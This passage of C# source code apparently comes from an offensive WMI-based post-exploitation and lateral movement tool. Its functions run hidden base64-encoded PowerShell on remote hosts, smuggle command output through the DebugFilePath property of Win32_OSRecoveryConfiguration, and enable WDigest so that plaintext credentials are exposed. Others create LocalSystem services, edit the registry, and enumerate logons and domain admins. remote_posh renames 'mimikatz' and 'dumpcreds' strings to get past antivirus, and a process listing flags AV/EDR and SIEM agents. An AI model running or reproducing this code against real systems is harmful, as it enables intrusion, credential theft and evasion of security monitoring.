                            var proc = new Process { StartInfo = procStartInfo };
                            proc.Start();

                            // Get the output into a string
                            var result = proc.StandardOutput.ReadToEnd();
                            // Display the command output.
                            Messenger.Info(result);
                        }
                        catch (Exception e)
                        {
                            Messenger.Info(e);
                        }

                        return true;
                    }

                    // WSMAN not enabled on the remote system, use another method
                    var options = new ObjectGetOptions();
                    var pather = new ManagementPath("Win32_Process");
                    var classInstance = new ManagementClass(scope, pather, options);
                    var inParams = classInstance.GetMethodParameters("Create");

                    var encodedCommand = "$data = (" + command + " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                    var encodedCommandB64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                    inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;

                    if (noDebugCheck)
                    {
                        // Method Options to set a timeout
                        var methodOptions = new InvokeMethodOptions(null, timeout);

                        var outParams = classInstance.InvokeMethod("Create", inParams, methodOptions);
                    }
                    else
                    {
                        var outParams = classInstance.InvokeMethod("Create", inParams, null);
                    }
                }

                if (!noDebugCheck)
                {
                    // Give it a second to write and check for changes to DebugFilePath
                    Thread.Sleep(5000);
                    CheckForFinishedDebugFilePath(originalWmiProperty, scope);


                    //Get the contents of the file in the DebugFilePath prop
                    var commandOutput = GetOsRecovery(scope).Split(',');
                    var output = new StringBuilder();

                    //Print output.
                    foreach (var integer in commandOutput)
                    {
                        try
                        {
                            var a = (char)Convert.ToInt32(integer);
                            output.Append(a);
                        }
                        catch
                        {
                            //pass
                        }
                    }

                    Messenger.Info(output);
                }
                else
                    Messenger.Info("New process spawned, not checking for output");

                SetOsRecovery(scope, originalWmiProperty);
            }
            else
            {
                Messenger.Info("Shhh...Not using PS");

                // Create the parameters and create the new process.
                var options = new ObjectGetOptions();
                var pather = new ManagementPath("Win32_Process");
                var classInstance = new ManagementClass(scope, pather, options);
                var inParams = classInstance.GetMethodParameters("Create");

                inParams["CommandLine"] = command;
                var outParams = classInstance.InvokeMethod("Create", inParams, null);

                Messenger.Info(Convert.ToUInt32(outParams["ReturnValue"]) == 0
                                ? "Successfully created process"
                                : "Issues creating process");
            }

            return true;
        }


        public object disable_wdigest(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            object oValue = 0;
            var mc = new ManagementClass("stdRegProv")
            {
                Scope = scope
            };

            var outParams = RegistryMod.CheckRegistryWmi("GetDWORDValue", 0x80000002, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", mc);

            if (Convert.ToUInt32(outParams["ReturnValue"]) == 0)
            {
                oValue = outParams["uValue"].ToString();
                if ((string)oValue != "0")
                {
                    // wdigest is enabled, let's disable it
                    var outParamsSet = RegistryMod.SetRegistryWmi("SetDWORDValue", 0x80000002, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", "0", mc);
                    // 0x80000002; // HKEY_LOCAL_MACHINE

                    Messenger.Info(outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0
                        ? "Successfully disabled wdigest"
                        : "Error disabling wdigest");
                }
                else
                    Messenger.Info("wdigest already disabled");
            }
            else
            {
                // GetDWORDValue call failed
                throw new PropertyNotFoundException();
            }

            return true;
        }

        public object enable_wdigest(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var mc = new ManagementClass("stdRegProv")
            {
                Scope = scope
            };

            var outParams = RegistryMod.CheckRegistryWmi("GetDWORDValue", 0x80000002,
                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", mc);

            if (outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0)
            {
                object oValue = outParams["uValue"].ToString();
                if ((string)oValue == "1")
                {
                    // wdigest is enabled
                    Messenger.Info("wdigest already enabled");
                }
                else
                {
                    // wdigest not enabled, let's enable it
                    var outParamsSet = RegistryMod.SetRegistryWmi("SetDWORDValue", 0x80000002,
                        "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", "1", mc);

                    Messenger.Info(outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0
                        ? "Successfully enabled wdigest"
                        : "Error enabling wdigest");
                }
            }
            else
            {
                // GetDWORDValue call failed or UseLogonCredential not created, let's create it
                var outParamsSet = RegistryMod.SetRegistryWmi("SetDWORDValue", 0x80000002,
                    "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", "1", mc);

                Messenger.Info(outParamsSet != null && Convert.ToUInt32(outParamsSet["ReturnValue"]) == 0
                    ? "Successfully created and enabled wdigest"
                    : "Error creating and enabling wdigest");
            }

            return true;
        }

        public object disable_winrm(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            if (!planter.Commander.NoPS)
            {
                var options = new ObjectGetOptions();
                var pather = new ManagementPath("Win32_Process");
                var classInstance = new ManagementClass(scope, pather, options);
                var inParams = classInstance.GetMethodParameters("Create");
                inParams["CommandLine"] = "powershell -w hidden -command \"Disable-PSRemoting -Force\"";

                var outParams = classInstance.InvokeMethod("Create", inParams, null);

                Messenger.Info(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0
                    ? "Successfully disabled WinRM"
                    : "Issues disabling WinRM");

                return Convert.ToUInt32(outParams?["ReturnValue"]) == 0;
            }
            else
            {
                Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
                return null;
            }
        }

        public object enable_winrm(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            if (!planter.Commander.NoPS)
            {
                var options = new ObjectGetOptions();
                var pather = new ManagementPath("Win32_Process");
                var classInstance = new ManagementClass(scope, pather, options);
                var inParams = classInstance.GetMethodParameters("Create");
                inParams["CommandLine"] = "powershell -w hidden -command \"Enable-PSRemoting -Force\"";

                var outParams = classInstance.InvokeMethod("Create", inParams, null);

                Messenger.Info(outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0 ? "Successfully enabled WinRM" : "Issues enabling WinRM");
                return Convert.ToUInt32(outParams?["ReturnValue"]) == 0;
            }

            Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
            return null;
        }

        public object registry_mod(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var regRootValues = new Dictionary<string, uint>
            {
                {"HKCR", 0x80000000},
                {"HKEY_CLASSES_ROOT", 0x80000000},
                {"HKCU", 0x80000001},
                {"HKEY_CURRENT_USER", 0x80000001},
                {"HKLM", 0x80000002},
                {"HKEY_LOCAL_MACHINE", 0x80000002},
                {"HKU", 0x80000003},
                {"HKEY_USERS", 0x80000003},
                {"HKCC", 0x80000005},
                {"HKEY_CURRENT_CONFIG", 0x80000005}
            };

            // Shouldn't really need more types for now. This can be added to later on
            string[] regValType = { "REG_SZ", "REG_EXPAND_SZ", "REG_BINARY", "REG_DWORD", "REG_MULTI_SZ" };
            var fullRegKey = planter.Commander.RegKey;

            // Grab the root key
            var fullRegKeyArray = fullRegKey.Split(new[] { '\\' }, 2);
            var defKey = fullRegKeyArray[0].ToUpper();
            var regKey = fullRegKeyArray[1];

            var mc = new ManagementClass("stdRegProv")
            {
                Scope = scope
            };

            //Make sure the root key is valid
            if (!regRootValues.ContainsKey(defKey))
            {
                Messenger.RedMessage("[-] Root registry key needs to be in the correct form and valid (ex: HKCU or HKEY_CURRENT_USER)");
                return null;
            }

            string pulledRegValType;
            switch (planter.Commander.Command)
            {
                case "reg_create" when !regValType.Any(planter.Commander.RegValType.ToUpper().Contains):
                    Messenger.RedMessage("[-] Registry value type needs to be in the correct form and valid (REG_SZ, REG_BINARY, or REG_DWORD)");
                    return null;
                case "reg_create":
                    {
                        var method = new GetMethods(planter.Commander.RegValType.ToUpper());
                        RegistryMod.SetRegistryWmi(method.RegSetMethod, regRootValues[defKey], regKey, planter.Commander.RegSubKey, planter.Commander.RegVal, mc);
                        break;
                    }
                case "reg_delete":
                    {
                        // Grab the correct type for the registry data entry
                        pulledRegValType = RegistryMod.CheckRegistryTypeWmi(regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc);
                        var method = new GetMethods(pulledRegValType);

                        var resultsDel = RegistryMod.CheckRegistryWmi(method.RegGetMethod, regRootValues[defKey], regKey,
                            planter.Commander.RegSubKey, mc);
                        if (Convert.ToUInt32(resultsDel["ReturnValue"]) == 0)
                            RegistryMod.DeleteRegistryWmi(regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc);
                        else
                        {
                            Messenger.Info("Issue deleting registry value");
                            return null;
                        }

                        break;
                    }
                case "reg_mod":
                    {
                        pulledRegValType = RegistryMod.CheckRegistryTypeWmi(regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc);
                        var method = new GetMethods(pulledRegValType);

                        var resultsMod = RegistryMod.CheckRegistryWmi(method.RegGetMethod,
                            regRootValues[defKey], regKey, planter.Commander.RegSubKey, mc);
                        if (Convert.ToUInt32(resultsMod["ReturnValue"]) == 0)
                        {
                            RegistryMod.SetRegistryWmi(method.RegSetMethod, regRootValues[defKey], regKey, planter.Commander.RegSubKey, planter.Commander.RegVal, mc);
                        }
                        else
                        {
                            Messenger.Info("Issue modifying registry value");
                            return null;
                        }

                        break;
                    }
            }

            return true;
        }

        public object remote_posh(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var originalWmiProperty = GetOsRecovery(scope);
            var wsman = true;
            string[] powerShellExtensions = { "ps1", "psm1", "psd1" };
            string modifiedWmiProperty = null;


            if (!File.Exists(planter.Commander.File))
            {
                Messenger.RedMessage(
                    "[-] Specified local PowerShell script does not exist, not running PS runspace\n");
                return null;
            }

            //Make sure it's a PS script
            if (!powerShellExtensions.Any(Path.GetExtension(planter.Commander.File).Contains))
            {
                Messenger.RedMessage(
                    "[-] Specified local PowerShell script does not have the correct extension not running PS runspace\n");
                return null;
            }

            Messenger.GoodMessage("[+] Executing cmdlet: " + planter.Commander.Cmdlet);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (var powershell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                            powershell.Runspace = RunspaceCreate(planter);
                        else
                            powershell.Runspace = RunspaceCreateLocal();
                    }
                    catch (System.Management.Automation.Remoting.PSRemotingTransportException)
                    {
                        wsman = false;
                    }

                    var script = File.ReadAllText(planter.Commander.File ?? throw new InvalidOperationException());

                    // Let's remove all comment blocks to save space/keep it from getting flagged
                    script = Regex.Replace(script, @"(?s)<#(.*?)#>", string.Empty);
                    // Let's also remove whitespace
                    script = Regex.Replace(script, @"^\s*$[\r\n]*", string.Empty, RegexOptions.Multiline);
                    // And all comments
                    script = Regex.Replace(script, @"#.*", "");

                    // Let's also modify all functions to random (but keep the name of the one we want)
                    // This is pretty hacky but i think will work for now
                    //string functionToRun = RandomString(10);
                    //script = script.Replace("Function " + planter.Commander.Cmdlet, functionToRun);
                    //script = Regex.Replace(script, @"Function .*", "Function " + RandomString(10), RegexOptions.IgnoreCase);
                    //script = script.Replace(functionToRun, "Function " + functionToRun);


                    // Try to remove mimikatz and replace it with something else along with some other 
                    // replacements from here https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
                    // Works currently but the unedited PS script fails for some reason
                    script = Regex.Replace(script, @"\bmimikatz\b", RandomString(5), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bdumpcreds\b", RandomString(6), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bargumentptr\b", RandomString(4), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc1\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc2\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc3\b", RandomString(10), RegexOptions.IgnoreCase);

                    if (powershell.Runspace.ConnectionInfo != null)
                    {
                        // This all works right now but if we see issues down the line with output we may need to throw the output in DebugFilePath property
                        // Will want to add in some obfuscation
                        powershell.AddScript(script).AddScript("Invoke-Expression ; " + planter.Commander.Cmdlet);

                        Collection<PSObject> results;
                        try
                        {
                            results = powershell.Invoke();
                        }
                        catch (Exception e)
                        {
                            Messenger.RedMessage("[-] Error: Issues with PowerShell script, it may have been flagged by AV");
                            Messenger.Info(e);
                            throw new CaughtByAvException("PS");
                        }


                        foreach (var result in results)
                        {
                            Messenger.Info(result);
                        }

                        //return true;
                    }
                    else
                        wsman = false;
                }
            }

            if (wsman == false)
            {
                var intList = new List<int>();
                var scriptBytes = File.ReadAllBytes(planter.Commander.File);

                //Convert from byte to int (bytes)
                foreach (var uploadByte in scriptBytes)
                {
                    int a = uploadByte;
                    intList.Add(a);
                }

                SetOsRecovery(scope, string.Join(",", intList));

                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, scope);

                // Get the debugfilepath again so we can check it later on for longer running tasks
                modifiedWmiProperty = GetOsRecovery(scope);

                // WSMAN not enabled on the remote system, use another method
                var options = new ObjectGetOptions();
                var pather = new ManagementPath("Win32_Process");
                var classInstance = new ManagementClass(scope, pather, options);
                var inParams = classInstance.GetMethodParameters("Create");

                var encodedCommand =
                    "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [char[]][int[]]$encdata.Split(',') -Join ' '; $a | .(-Join[char[]]@(105,101,120));";
                encodedCommand += "$output = (" + planter.Commander.Cmdlet + " | Out-String).Trim();";
                encodedCommand += " $EncodedText = [Int[]][Char[]]$output -Join ',';";
                encodedCommand +=
                    " $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()";

                var encodedCommandB64 =
                    Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                inParams["CommandLine"] = "powershell -enc " + encodedCommandB64;

                var outParams = classInstance.InvokeMethod("Create", inParams, null);

                if (outParams != null)
                    switch (Convert.ToUInt32(outParams["ReturnValue"]))
                    {
                        case 0:
                            break;
                        default:
                            throw new CaughtByAvException("PS");
                    }

                // Give it a second to write
                Thread.Sleep(1000);
            }

            // Give it a second to write and check for changes to DebugFilePath. Should never be null but we should make sure
            Thread.Sleep(1000);
            if (modifiedWmiProperty != null)
                CheckForFinishedDebugFilePath(modifiedWmiProperty, scope);


            //Get the contents of the file in the DebugFilePath prop
            var commandOutput = GetOsRecovery(scope).Split(',');
            var output = new StringBuilder();

            //Print output.
            foreach (var integer in commandOutput)
            {
                try
                {
                    var a = (char)Convert.ToInt32(integer);
                    output.Append(a);
                }
                catch
                {
                    //pass
                }
            }

            Messenger.Info(output);
            SetOsRecovery(scope, originalWmiProperty);
            return true;
        }

        public object service_mod(Planter planter)
        {
            // For now, let's just view, start, stop, create, and delete a service, eh?
            var scope = planter.Connector.ConnectedWmiSession;
            var serviceName = planter.Commander.Service;
            var servicePath = planter.Commander.ServiceBin;
            var subCommand = planter.Commander.Execute;

            var legitService = false;

            var query = new ObjectQuery("SELECT * FROM Win32_Service");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();
            var pather = new ManagementPath($"Win32_Service.Name='{serviceName}'");
            var classInstance = new ManagementObject(scope, pather, null);


            if (subCommand == "list")
            {
                Messenger.Info("{0,-45}{1,-40}{2,15}{3,15}", "Name", "Display Name", "State", "Accept Stopping?");
                Messenger.Info("{0,-45}{1,-40}{2,15}{3,15}", "-------", "-------", "-------", "-------?");


                foreach (var o in queryCollection)
                {
                    var wmiObject = (ManagementObject)o;
                    if (wmiObject["DisplayName"] != null && wmiObject["Name"] != null)
                    {
                        var name = (string)wmiObject["Name"];
                        if (name.Length > 40)
                            name = Truncate(name, 40) + "...";
                        var displayName = (string)wmiObject["DisplayName"];
                        if (displayName.Length > 35)
                            displayName = Truncate(displayName, 35) + "...";

                        try
                        {
                            Messenger.Info("{0,-45}{1,-40}{2,15}{3,15}", name, displayName, wmiObject["State"], wmiObject["AcceptStop"]);
                        }
                        catch
                        {
                            //value probably doesn't exist, so just pass
                        }
                    }
                }
            }

            switch (subCommand)
            {
                case "start":
                    {
                        // Let's make sure the service name is valid
                        foreach (var o in queryCollection)
                        {
                            var wmiObject = (ManagementObject)o;
                            if (wmiObject["Name"].ToString() == serviceName)
                            {
                                if (wmiObject["State"].ToString() != "Running")
                                    legitService = true;
                                else
                                {
                                    Messenger.YellowMessage("The process is already running, please stop it first");
                                    return null;
                                }
                            }
                        }

                        if (legitService)
                        {
                            // Execute the method and obtain the return values.
                            var outParams = classInstance.InvokeMethod("StartService", null, null);

                            // List outParams
                            if (outParams != null)
                                switch (Convert.ToUInt32(outParams["ReturnValue"]))
                                {
                                    case 0:
                                        Messenger.Info("Successfully started service: " + serviceName);
                                        return queryCollection;
                                    case 1:
                                        Messenger.Info("The request is not supported for service: " + serviceName);
                                        return null;
                                    case 2:
                                        Messenger.Info("The user does not have the necessary access for service: " +
                                                       serviceName);
                                        return null;
                                    case 7:
                                        Messenger.Info(
                                            "The service did not respond to the start request in a timely fasion, is the binary an actual service binary?");
                                        return null;
                                    default:
                                        Messenger.Info("The service: " + serviceName +
                                                       " was not started. Return code: " +
                                                       Convert.ToUInt32(outParams["ReturnValue"]));
                                        return null;
                                }
                        }

                        else
                            throw new ServiceUnknownException(serviceName);

                        break;
                    }
                case "stop":
                    {
                        // Let's make sure the service name is valid
                        foreach (var o in queryCollection)
                        {
                            var wmiObject = (ManagementObject)o;
                            if (wmiObject["Name"].ToString() == serviceName)
                            {
                                if (wmiObject["State"].ToString() == "Running" && wmiObject["AcceptStop"].ToString() == "True")
                                    legitService = true;
                                else
                                {
                                    Messenger.YellowMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                    return null;
                                }
                            }
                        }

                        if (legitService)
                        {
                            // Execute the method and obtain the return values.
                            var outParams = classInstance.InvokeMethod("StopService", null, null);


                            // List outParams
                            if (outParams != null)
                                switch (Convert.ToUInt32(outParams["ReturnValue"]))
                                {
                                    case 0:
                                        Messenger.Info("Successfully stopped service: " + serviceName);
                                        return queryCollection;
                                    case 1:
                                        Messenger.Info("The request is not supported for service: " + serviceName);
                                        return null;
                                    case 2:
                                        Messenger.Info("The user does not have the necessary access for service: " +
                                                       serviceName);
                                        return null;
                                    default:
                                        Messenger.Info("The service: " + serviceName +
                                                       " was not stopped. Return code: " +
                                                       Convert.ToUInt32(outParams["ReturnValue"]));
                                        return null;
                                }
                        }

                        else
                            throw new ServiceUnknownException(serviceName);

                        break;
                    }
                case "delete":
                    {
                        // Let's make sure the service name is valid
                        foreach (var o in queryCollection)
                        {
                            var wmiObject = (ManagementObject)o;
                            if (wmiObject["Name"].ToString() == serviceName)
                            {
                                if (wmiObject["State"].ToString() == "Running" && wmiObject["AcceptStop"].ToString() == "True")
                                {
                                    // Let's stop the service
                                    legitService = true;
                                    var outParams = classInstance.InvokeMethod("StopService", null, null);
                                    if (outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) != 0)
                                        Messenger.YellowMessage("[-] Warning: Unable to stop the service before deletion. Still marking the service to be deleted after stopping");
                                }
                                else if (wmiObject["State"].ToString() == "Stopped")
                                {
                                    legitService = true;
                                }

                                else
                                {
                                    Messenger.YellowMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                    return null;
                                }
                            }
                        }

                        if (legitService)
                        {
                            // Execute the method and obtain the return values.
                            var outParams = classInstance.InvokeMethod("Delete", null, null);

                            // List outParams
                            if (outParams != null)
                                switch (Convert.ToUInt32(outParams["ReturnValue"]))
                                {
                                    case 0:
                                        Messenger.Info("Successfully deleted service: " + serviceName);
                                        return queryCollection;
                                    case 1:
                                        Messenger.Info("The request is not supported for service: " + serviceName);
                                        return null;
                                    case 2:
                                        Messenger.Info("The user does not have the necessary access for service: " +
                                                       serviceName);
                                        return null;
                                    default:
                                        Messenger.Info("The service: " + serviceName +
                                                       " was not stopped. Return code: " +
                                                       Convert.ToUInt32(outParams["ReturnValue"]));
                                        return null;
                                }
                        }

                        else
                            throw new ServiceUnknownException(serviceName);

                        break;
                    }
                case "create":
                    {
                        var options = new ObjectGetOptions();
                        var patherCreate = new ManagementPath("Win32_Service");
                        var classInstanceCreate = new ManagementClass(scope, patherCreate, options);

                        // Let's make sure the service name is not already used
                        foreach (var o in queryCollection)
                        {
                            var wmiObject = (ManagementObject)o;
                            if (wmiObject["Name"].ToString() == serviceName)
                            {
                                Messenger.RedMessage("The process name provided already exists, please specify another one");
                                return null;
                            }
                        }

                        if (!legitService)
                        {
                            // Obtain in-parameters for the method
                            var inParams = classInstanceCreate.GetMethodParameters("Create");

                            // Add the input parameters.
                            inParams["Name"] = serviceName;
                            inParams["DisplayName"] = serviceName;
                            inParams["PathName"] = servicePath;
                            inParams["ServiceType"] = 16;
                            inParams["ErrorControl"] = 2;
                            inParams["StartMode"] = "Automatic";
                            inParams["DesktopInteract"] = true;
                            inParams["StartName"] = ".\\LocalSystem";
                            inParams["StartPassword"] = "";


                            // Execute the method and obtain the return values.
                            var outParams = classInstanceCreate.InvokeMethod("Create", inParams, null);

                            // List outParams
                            if (outParams != null)
                                switch (Convert.ToUInt32(outParams["ReturnValue"]))
                                {
                                    case 0:
                                        Messenger.Info("Successfully created service: " + serviceName);
                                        return queryCollection;
                                    case 1:
                                        Messenger.Info("The request is not supported for service: " + serviceName);
                                        return null;
                                    case 2:
                                        Messenger.Info("The user does not have the necessary access for service: " +
                                                       serviceName);
                                        return null;
                                    default:
                                        Messenger.Info("The service: " + serviceName + " was not stopped. Return code: " +
                                                       (int)outParams["ReturnValue"]);
                                        return null;
                                }
                        }

                        else
                            throw new ServiceUnknownException(serviceName);

                        break;
                    }
            }

            return queryCollection;
        }


        public object ps(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var fileQuery = new ObjectQuery("SELECT * FROM Win32_Process");
            var fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
            var queryCollection = fileSearcher.Get();


            Messenger.Info("{0,-50}{1,15}", "Name", "Handle");
            Messenger.Info("{0,-50}{1,15}", "-----------", "---------");


            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                var name = (string)wmiObject["Name"];
                if (name.Length > 45)
                    name = Truncate(name, 45) + "...";
                try
                {
                    if (SharedGlobals.AVs.Any(name.ToLower().Equals))
                    {
                        // Make AV/EDR pop
                        Messenger.RedMessage("{0,-50}{1,15}", name, wmiObject["Handle"]);
                    }
                    else if (SharedGlobals.Admin.Any(name.ToLower().Equals))
                    {
                     
                        // Make admin tools pop
                        Messenger.BlueMessage("{0,-50}{1,15}", name, wmiObject["Handle"]);
                    }
                    else if (SharedGlobals.SIEM.Any(name.ToLower().Equals))
                    {
                        // SIEM Agent
                        Messenger.YellowMessage("{0,-50}{1,15}", name, wmiObject["Handle"]);
                    }
                    else
                        Messenger.Info("{0,-50}{1,15}", name, wmiObject["Handle"]);
                }
                catch
                {
                    //value probably doesn't exist, so just pass
                }
            }

            Messenger.BlueMessage("\nDenotes a potential admin tool");
            Messenger.RedMessage("Denotes a potential AV/EDR product");
            Messenger.YellowMessage("Denotes a potential SIEM agent");

            return queryCollection;
        }

        public object process_kill(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var processToKill = planter.Commander.Process;

            var procDict = new Dictionary<string, string>();

            // Grab all procs so we can build the dictionary
            var procQuery = new ObjectQuery("SELECT * FROM Win32_Process");
            var procSearcher = new ManagementObjectSearcher(scope, procQuery);
            var queryCollection = procSearcher.Get();

            // Probs not efficient but let's create a dict of all the handles/process names
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                procDict.Add((string)wmiObject["Handle"], (string)wmiObject["Name"]);
            }

            // If a process handle was given just kill it
            if (uint.TryParse(processToKill, out var result))
            {
                KillProc(processToKill, procDict[processToKill], scope);
            }

            // If we got a process name
            else
            {
                //Parse for * sent in process name
                ObjectQuery pQuery;
                if (processToKill.Contains("*"))
                {
                    processToKill = processToKill.Replace("*", "%");
                    pQuery = new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name like '{processToKill}'");
                }
                else
                {
                    pQuery = new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name='{processToKill}'");
                }

                var pSearcher = new ManagementObjectSearcher(scope, pQuery);
                var qCollection = pSearcher.Get();

                foreach (var o in qCollection)
                {
                    var wmiObject = (ManagementObject)o;
                    KillProc(wmiObject["Handle"].ToString(), procDict[wmiObject["Handle"].ToString()], scope);
                }
            }
            return true;
        }

        public object process_start(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var binPath = planter.Commander.Process;

            if (!CheckForFile(binPath, scope, verbose: false))
            {
                Messenger.RedMessage(
                    "[-] Specified file does not exist on the remote system, not creating process\n");
                return null;
            }

            var pather = new ManagementPath("Win32_Process");
            var classInstance = new ManagementClass(scope, pather, null);

            // Obtain in-parameters for the method
            var inParams = classInstance.GetMethodParameters("Create");

            // Add the input parameters.
            inParams["CommandLine"] = binPath;

            // Execute the method and obtain the return values.
            var outParams = classInstance.InvokeMethod("Create", inParams, null);

            if (outParams != null)
                switch (int.Parse(outParams["ReturnValue"].ToString()))
                {
                    case 0:
                        Messenger.Info("Process {0} has been successfully created",
                            outParams["ProcessID"].ToString());
                        return true;
                    case 2:
                        throw new SecurityException("Access denied");
                    case 3:
                        throw new SecurityException("Insufficient privilege");
                    case 21:
                        throw new Exception("Invalid parameter");
                    default:
                        throw new Exception("Unknown failure");
                }

            return true;
        }

        public object logon_events(Planter planter)
        {
            // Hacky solution but works for now

            var scope = planter.Connector.ConnectedWmiSession;

            string[] logonType = { "Logon Type:		2", "Logon Type:		10" };
            const string logonProcess = "Logon Process:		User32";
            var searchTerm = new Regex(@"(Account Name.+|Workstation Name.+|Source Network Address.+)");
            var r = new Regex("New Logon(.*?)Authentication Package", RegexOptions.Singleline);
            var outputList = new List<string[]>();
            var latestDate = DateTime.MinValue;

            var query =
                new ObjectQuery("SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            Messenger.YellowMessage("Depending on the amount of events, this may take some time to parse through.\n");

            Messenger.Info("{0,-30}{1,-30}{2,-40}{3,-20}", "User Account", "System Connecting To", "System Connecting From", "Last Login");
            Messenger.Info("{0,-30}{1,-30}{2,-40}{3,-20}", "------------", "--------------------", "----------------------", "----------");

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                var message = wmiObject["Message"].ToString(); // Let's avoid doing this multiple times

                if (logonType.Any(message.Contains) && message.Contains(logonProcess))
                {
                    var singleMatch = r.Match(wmiObject["Message"].ToString());
                    var breaks = singleMatch.Value.Split(new[] { Environment.NewLine }, StringSplitOptions.None);
                    var queryMatchingFiles =
                        from line in breaks
                        let matches = searchTerm.Matches(line)
                        where matches.Count > 0
                        where !line.EndsWith("$")
                        select line;

                    var tempList = new List<string>();
                    foreach (var v in queryMatchingFiles)
                    {
                        var importantInfo = v.Split(new[] { ":" }, StringSplitOptions.RemoveEmptyEntries);
                        if (importantInfo[1].Trim() != "-")
                        {
                            if (!string.IsNullOrEmpty(importantInfo[1].Trim()))
                                tempList.Add(importantInfo[1].Trim());
                        }
                    }

                    var tempDate = ManagementDateTimeConverter.ToDateTime(wmiObject["TimeGenerated"].ToString());
                    tempList.Add(tempDate.ToString(CultureInfo.InvariantCulture));

                    var tempArray = tempList.ToArray();

                    // We need to check if this is the first loop and handle accordingly
                    if (outputList.Count > 0)
                    {
                        // If any of the arrays in the outputList do not match the temp array (excluding datetime value)
                        if (!outputList.Any(p => p.Take(3).SequenceEqual(tempArray.Take(3))))
                        {
                            outputList.Add(tempArray);
                            latestDate = tempDate;
                        }
                    }

                    else
                        outputList.Add(tempArray);
                }
            }

            foreach (var entry in outputList)
            {
                Messenger.Info("{0,-30}{1,-30}{2,-40}{3,-20}", entry[0], entry[1], entry[2], entry[3]);
            }

            return queryCollection;
        }

        #endregion

        #region Lateral Movement Facilitation (LDAP Namespace)


        #region Users & Roles

        /// <summary>
        /// https://wutils.com/wmi/root/directory/ldap/ds_user/instances.html
        /// </summary>
        /// <param name="planter"></param>
        /// <returns></returns>
        public object ls_domain_users(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);
            if (queryCollection == null)
                return null;

            var table = new ConsoleTable("Name", "Description", "Email", "Last Logon", "PasswordLastSet", "Domain Admin").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                
                var name = wmiObject["DS_sAMAccountName"]?.ToString();


                if (name != null && (name.StartsWith("$")))
                    continue;

                if (name != null && (name.StartsWith("HealthMailbox") && name.Length == 20))
                    continue;

                if (name != null && (name.StartsWith("SM_") && name.Length == 20))
                    continue;

                var isAdmin = IsDomainAdmin(wmiObject["DS_memberOf"]);

                var dSDescriptionArr = Helpers.ToArray(wmiObject["DS_description"]);
                var accountDescription = string.Empty;
                if (dSDescriptionArr != null && dSDescriptionArr.Length > 0)
                    accountDescription = dSDescriptionArr[0];

                long.TryParse(wmiObject["DS_lastLogon"]?.ToString(), out var lastLogonStr);
                var lastLogon = Helpers.ParseAdDateTime(lastLogonStr);

                long.TryParse(wmiObject["DS_pwdLastSet"]?.ToString(), out var lastPasswddSetStr);
                var lastPasswdSet = Helpers.ParseAdDateTime(lastPasswddSetStr);

